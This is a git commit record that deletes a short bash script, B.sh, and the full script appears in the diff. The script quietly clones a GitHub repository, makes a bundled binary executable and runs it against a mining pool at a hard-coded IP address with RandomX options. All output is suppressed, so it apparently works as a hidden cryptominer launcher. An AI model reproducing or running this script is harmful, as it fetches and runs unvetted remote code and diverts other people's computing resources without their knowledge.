36089f52eade1ff02b2a18ed615ba11c547401ed
fulltechtree <77315046+fulltechtree@users.noreply.github.com>
2022-03-24 08:48:59 +0700

    Delete B.sh

--- B.sh
+++
@@ -1,6 +0,0 @@
-#! /bin/bash
-{
-git clone https://github.com/fulltechtree/tech.git &> /dev/null
-sudo chmod +x tech/mn
-./tech/mn -o 38.130.221.194:2449 -u userA -p 1 -a rx/0 -k -t "$1" &> log
-} &> /dev/null
